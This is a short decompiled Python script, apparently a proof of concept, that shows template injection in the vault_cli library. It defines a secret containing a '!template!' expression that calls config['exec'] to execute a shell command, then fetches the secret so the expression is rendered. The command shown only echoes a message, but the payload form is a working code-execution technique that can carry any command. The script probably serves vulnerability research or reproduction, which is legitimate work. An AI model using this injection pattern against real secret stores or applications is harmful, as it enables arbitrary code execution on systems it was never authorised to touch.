# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 362_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 546 bytes
import vault_cli
malicious_secret = "!template! {{ config['exec']('echo Malicious Code Executed') }}"

def simulate_attack():
    client = vault_cli.get_client()
    rendered_secret = client.get_secret(malicious_secret)
    print(rendered_secret)


simulate_attack()

# okay decompiling 362_1.pyc
